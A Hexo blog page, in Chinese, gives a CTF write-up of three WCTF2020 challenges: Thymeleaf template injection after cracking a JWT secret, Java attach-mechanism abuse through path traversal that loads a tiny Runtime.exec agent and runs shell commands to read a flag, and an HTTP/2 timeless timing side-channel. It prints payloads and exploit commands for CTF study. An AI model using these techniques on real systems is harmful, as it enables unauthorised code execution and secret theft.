@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="对参加的比赛进行复盘是一件很快乐的事情，有些高质量的比赛会学到很多新的知识。这次的WCTF2020中遇到的3道题目都能学到不少，在这里记录下writeup。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WCTF2020 WriteUp及分析">
+<meta property="og:url" content="http://yoursite.com/2020/12/03/wctf2020/index.html">
+<meta property="og:site_name" content="Ananaskr&#39;s Blog">
+<meta property="og:description" content="对参加的比赛进行复盘是一件很快乐的事情，有些高质量的比赛会学到很多新的知识。这次的WCTF2020中遇到的3道题目都能学到不少，在这里记录下writeup。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/thy-1.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/thy-2.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/thy-3.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/thy-4.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/thy-5.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/thy-6.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/thy-7.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/ssh-1.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/ssh-2.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/ssh-3.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/ssh-4.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/ssh-5.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/ssh-6.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/ssh-7.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/ssh-8.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/ssh-9.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/ssh-10.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/spa-1.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/spa-2.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/wctf2020/spa-3.png">
+<meta property="article:published_time" content="2020-12-03T06:23:38.000Z">
+<meta property="article:modified_time" content="2020-12-04T08:00:38.185Z">
+<meta property="article:author" content="ananaskr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/12/03/wctf2020/thy-1.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/12/03/wctf2020/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>WCTF2020 WriteUp及分析 | Ananaskr's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ananaskr's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/About/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/03/wctf2020/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ananaskr">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ananaskr's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WCTF2020 WriteUp及分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-12-03 14:23:38" itemprop="dateCreated datePublished" datetime="2020-12-03T14:23:38+08:00">2020-12-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-12-04 16:00:38" itemprop="dateModified" datetime="2020-12-04T16:00:38+08:00">2020-12-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>对参加的比赛进行复盘是一件很快乐的事情，有些高质量的比赛会学到很多新的知识。这次的WCTF2020中遇到的3道题目都能学到不少，在这里记录下writeup。</p>
+<a id="more"></a>
+
+<h2 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h2><p>thymeleaf这道题从名字上来看就是一道模版注入题。题目首先需要扫描路径，经过扫描，发现登录接口<code>/login</code>。<br><img src="thy-1.png" alt=""><br>抓包之后发现seesion为jwt加密，然后使用c-jwt-crack工具爆破secret，爆破出来的secret为admin。然后伪造session，成功登入。接下来需要寻找注入点。<br><img src="thy-2.png" alt=""><br>由于扫描出来了<code>/swagger-ui.html</code>，一个swagger文档，就直接拿到了接口信息，进行下面的操作。<br><img src="thy-3.png" alt=""><br>正常情况下，<code>/auth/user/&lt;username&gt;</code>返回的是一个JSON响应。<br><img src="thy-4.png" alt=""><br>使用DELETE方法后，得到的是不一样的响应结果。<br><img src="thy-5.png" alt=""><br>提示找不到模版，说明将<code>/auth/user/admin</code>作为模版，寻找对应的.html文件。当path中存在双引号或者单引号时，会出现如下信息，需要绕过引号，方法很多。<br><img src="thy-6.png" alt=""><br>这里是将整个path作为viewname了，由于可控的只有部分内容，使用<code>__...__</code>包裹能够使得<code>__...__</code>里面的内容进行预处理，对应的需要使用的payload形式为<code>__${}__::x.</code>，这里payload形式为什么是这样，可参考另一篇<a href="">文章</a>，这里就不解释了。绕过引号的方式很多。</p>
+<ul>
+<li>true.toString().charAt(0).toChars()[0].toString()</li>
+<li>T(Character).toString(104)</li>
+<li>T(String).valueOf(new char[]{xx,xx,xx,xx,x})</li>
+</ul>
+<p>选择的是执行命令的方式，环境在window下，最终选用<code>cmd.exe -c more flag</code>。Java中用type命令并不能读到flag。<br>最终的结果为<br><img src="thy-7.png" alt=""></p>
+<h2 id="SSHLYUXA"><a href="#SSHLYUXA" class="headerlink" title="SSHLYUXA"></a>SSHLYUXA</h2><p>这是一道很有意思的Java Pwn题，攻击思路以及后续的利用都值得学习。<br>题目描述<br>题目通过ssh方式成功登录，然后可以选择创建一个App或者销毁一个App。在这个App中，用户可以做以下三个操作：</p>
+<ul>
+<li><strong>Register username</strong>。 应用程序会请求public key并将其存储在当前目录的keys/目录中，文件名为username.pub。</li>
+<li><strong>Auth username</strong>。 应用程序会产生一个值并要求用户用key进行加密以验证其身份。验证成功则会监听一个unix socket，等待即将到来的message。socket文件在当前目录的socket/目录中，文件名为username。</li>
+<li><strong>msgto username</strong>。 应用程序会显示接收方的public key，读取加密的message并发送至相应的unix socket。</li>
+</ul>
+<p>这道题目给出了源码，从源码中可以看出，无论是在生成public key或者unix socket文件时，都存在目录遍历漏洞，可将文件写在任意位置。<br><img src="ssh-1.png" alt=""><br><img src="ssh-2.png" alt=""><br><img src="ssh-3.png" alt=""></p>
+<p>通过目录遍历漏洞，可以将socket文件、pub文件写入任意位置，也能读取任意位置的pub文件。<br>结合Java Attach机制就可以做这道题了。利用Java Attach机制attach上目标JVM，上传恶意的agent文件，然后发送动态加载agent的指令即可，将命令执行结果保存在一个pub文件中，然后读取pub文件内容。</p>
+<p>整个题目的思路很清晰了，分为以下两步。</p>
+<ul>
+<li>attach上目标JVM</li>
+<li>动态加载agent</li>
+</ul>
+<h3 id="attach目标JVM"><a href="#attach目标JVM" class="headerlink" title="attach目标JVM"></a>attach目标JVM</h3><p>根据上面对于Java Attach机制的分析，我们首先需要获得目标JVM的pid，然后启动目标JVM的Attach Listener线程。</p>
+<p>目标JVM的pid可通过main线程的nid进行预测。通过向目标JVM发送<code>SIGQUIT</code>信号，即可打印出这些信息。<br><img src="ssh-4.png" alt=""><br>在ubuntu20.04下pid为nid-1的十进制，这里为46439。<br>获取到目标JVM的pid后，就可以创建<code>.attach_pid46439</code>文件，利用前面的目标遍历漏洞，在register并auth后，可以创建任意位置的<code>.attach_pid46439</code>文件。此时执行的命令为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">register ..&#x2F;.attach_pid46439</span><br><span class="line">auth ..&#x2F;.attach_pid46439</span><br></pre></td></tr></table></figure>
+<p><img src="ssh-5.png" alt=""><br>这样，就成功创建了<code>.attach_pid46439</code>文件，然后再次发送<code>SIGQUIT</code>信号。此时可以发现<code>/tmp/.java_pid46439</code>成功创建，说明已经成功attach上目标JVM。</p>
+<h3 id="动态加载agent"><a href="#动态加载agent" class="headerlink" title="动态加载agent"></a>动态加载agent</h3><p>agent的内容是攻击者上传的一个恶意Jar包。由于任意写入到.pub文件限制了512字节的大小，因此需要整个Jar包的内容非常简洁。自然地，一个精简的内容如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;A.java</span><br><span class="line">import java.lang.instrument.Instrumentation;</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line"></span><br><span class="line">public class A&#123;</span><br><span class="line">    public static void agentmain(String string, Instrumentation instrumentation) throws Exception&#123;</span><br><span class="line">        java.lang.Runtime.getRuntime().exec(string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;META-INF&#x2F;MANIFEST.MF</span><br><span class="line">Agent-Class: A</span><br></pre></td></tr></table></figure>
+<p>采用Jar命令压缩时仍然超出了512字节的大小，由于Jar也是标准的zip压缩格式，可以采用具有更高压缩比的7z压缩方式，压缩命令为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z a -tzip -mx&#x3D;9 agent.jar META-INF&#x2F;MANIFEST.MF A.class</span><br></pre></td></tr></table></figure>
+<p>压缩完，确实比之前减少了很所，但仍然超过了512字节，查看A.class，java自动地加上了默认构造函数。<br><img src="ssh-6.png" alt=""><br>可利用处理器编写Processor来移除它。执行的命令为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -g:none -processor MyProcessor A.java</span><br></pre></td></tr></table></figure>
+<p>即便这样之后，还未达到512字节，使用字节码编辑器去掉异常相关代码，并移除pop操作，这样最终准备好了512字节的Jar包。将其写入到/tmp/pld.pub文件中，执行注册命令，然后输入十六进制编码的Jar包内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">register ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;pld</span><br><span class="line">&gt;&gt;&gt; 输入Jar包内容</span><br></pre></td></tr></table></figure>
+<p><img src="ssh-7.png" alt=""></p>
+<p>然后向目标JVM发送动态加载Jar包的命令，由于向<code>/tmp/.java_pid46439</code>发送命令，需要使用msgto <username>。因此需要注册一个<code>../../../../../tmp/.java_pid46439</code>用户。<br><img src="ssh-8.png" alt=""></p>
+<p>在注册完后，即可向其发送消息，消息内容为十六进制编码的命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1\x00load\x00instrument\x00false\x00&#x2F;tmp&#x2F;pld.pub&#x3D;sh -c $@|sh . echo &#x2F;readflag &#x2F;FLAG&gt;&#x2F;tmp&#x2F;flag.pub\x00</span><br></pre></td></tr></table></figure>
+<p><img src="ssh-9.png" alt=""><br>发送完之后，这条指令就会被执行，因此flag内容被存入了/tmp/flag.pub中，此时只需要向../../../../../tmp/flag发送消息，就会将/tmp/flag.pub内容十六进制编码后显示出来。最后获取到了flag。<br><img src="ssh-10.png" alt=""></p>
+<h2 id="Spaceless-Spacing"><a href="#Spaceless-Spacing" class="headerlink" title="Spaceless Spacing"></a>Spaceless Spacing</h2><p>题目给了一句话<code>&quot;connect to 3.137.154.50:4242&quot;</code>，这就是全部了。首先nc连上，看看有什么结果。<br><img src="spa-1.png" alt=""><br>Google一下第一行+HTTP，得知为HTTP/2.0协议。curl提供了–http2-prior-knowledge参数来使用HTTP/2.0协议。<br>curl命令加上<code>--http2-prior-knowlwdge</code>参数，可以发送http/2.0协议的请求。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --http2-prior-knowledge localhost:4242&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="spa-2.png" alt=""><br>就这样获得了应用的源码。尝试了/<secret>这个API，确实存在。<br><img src="spa-3.png" alt=""><br>分析程序逻辑，首先可以爆破secret的位数，接下来爆破每一位的具体值看起来应该使用时间侧信道。即比较时若匹配失败直接返回，匹配成功则会sleep一个很小的时间，进行下一次的匹配直接匹配失败返回。因此某一位匹配成功时，返回的响应会晚一些。如果是采用测量时间差的方式，会受到很大的网络扰动，这根本不可能成功。但是在HTTP/2.0协议下，可以不用测量时间差就可以获得返回响应的顺序。这道题目的作者参考了USENIX2020的一篇论文”Timeless Timing Attacks: Exploiting Concurrency to Leak Secrets over Remote Connection”。这篇论文中介绍了这样的利用方式。</p>
+<h3 id="HTTP-2-0新特性"><a href="#HTTP-2-0新特性" class="headerlink" title="HTTP/2.0新特性"></a>HTTP/2.0新特性</h3><blockquote>
+<p>HTTP/2通过支持标头字段压缩和在同一连接上进行多个并发交换，让应用更有效地利用网络资源。还允许为请求设置优先级，让更重要的请求更快速地完成，从而进一步提升性能。<br>HTTP/2所有性能增强的核心在于新的二进制分帧层，它定义了如何封装HTTP消息并在客户端与服务器之间传输。可归纳如下:</p>
+</blockquote>
+<ul>
+<li>所有通信都在一个TCP连接上完成，此链接可以承载任意数量的双向数据流。</li>
+<li>每个数据流都有一个唯一的标识符和可选的优先级信息，用于承载双向消息。</li>
+<li>每条消息都是一条逻辑HTTP消息(如请求/响应)，包含一个或多个帧。</li>
+<li>帧是最小的通信单位，承载着特定类型的数据，例如HTTP标头、消息负载等等。来自不同数据流的帧可以交错发送，然后根据每个帧头的数据流标识符重新组装。</li>
+</ul>
+<h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>从HTTP/2.0协议的新特性中得知，每个数据流都会有一个唯一的标识符，称为streamId。由于多路复用的特性，不同的请求在同一连接中以几乎并行的方式发送，服务端会根据streamId重新组装然后执行请求逻辑，一有返回立即发送响应内容。因此可以通过如下的方式侧信道得出每一位secret值。<br>首先爆破出secret的位数，假设为10。<br>那么接下来，对于其中的每一位，在尝试所有字符的爆破时，准备2种类型的请求。</p>
+<ol>
+<li><font color=#008000>A</font>:secret参数中对应的位为”*”(一个绝对不会存在secret中的字符)，使得在比较该位时，一定会失败然后直接返回。</li>
+<li><font color=#008000>B</font>:secret参数中对应的位为尝试爆破的字符，使得在比较该位时，有可能会比较成功，然后sleep一个很小的时间，后返回。</li>
+</ol>
+<p>然后通过返回顺序来猜测该位的值，为了避免误差，这两种请求的发送顺序会分别进行交换。且对于每一组实验，分别进行10次。即整个过程是这样的。</p>
+<ul>
+<li>第一次: 先发送A,紧接着发送B。在10次实验的结果中，若A返回更快的次数更多，则认定A先返回，否则认为B返回更快。  </li>
+<li>第二次: 先发送B，紧接着发送A。在10次实验结果中，若A返回更快的次数更多，则认定A先返回，否则认为B返回更快。</li>
+</ul>
+<p>结果判断依据。<br>第一次A返回更快且第二次B返回更快  =&gt; 不是正确的字符<br>第一次A返回更快且第二次A返回更快 =&gt; 是正确字符<br>第一次B返回更快且第二次A返回更快 =&gt; 不是正确的字符<br>第一次B返回更快且第二次B返回更快 =&gt; 不是正确字符</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://github.com/paul-axe/ctf/tree/master/wctf2020/sshlyuxa" target="_blank" rel="noopener">https://github.com/paul-axe/ctf/tree/master/wctf2020/sshlyuxa</a></li>
+<li><a href="https://github.com/ConnorNelson/spaceless-spacing" target="_blank" rel="noopener">https://github.com/ConnorNelson/spaceless-spacing</a></li>
+<li><a href="https://developers.google.com/web/fundamentals/performance/http2?hl=zh-cns" target="_blank" rel="noopener">https://developers.google.com/web/fundamentals/performance/http2?hl=zh-cn</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/25/timeless-timing-attack/" rel="prev" title="timeless-timing-attack">
+      <i class="fa fa-chevron-left"></i> timeless-timing-attack
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/02/24/wctf2020-thymeleaf/" rel="next" title="wctf2020-thymeleaf">
+      wctf2020-thymeleaf <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Thymeleaf"><span class="nav-number">1.</span> <span class="nav-text">Thymeleaf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSHLYUXA"><span class="nav-number">2.</span> <span class="nav-text">SSHLYUXA</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#attach目标JVM"><span class="nav-number">2.1.</span> <span class="nav-text">attach目标JVM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#动态加载agent"><span class="nav-number">2.2.</span> <span class="nav-text">动态加载agent</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Spaceless-Spacing"><span class="nav-number">3.</span> <span class="nav-text">Spaceless Spacing</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-2-0新特性"><span class="nav-number">3.1.</span> <span class="nav-text">HTTP&#x2F;2.0新特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目复现"><span class="nav-number">3.2.</span> <span class="nav-text">题目复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ananaskr</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ananaskr</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
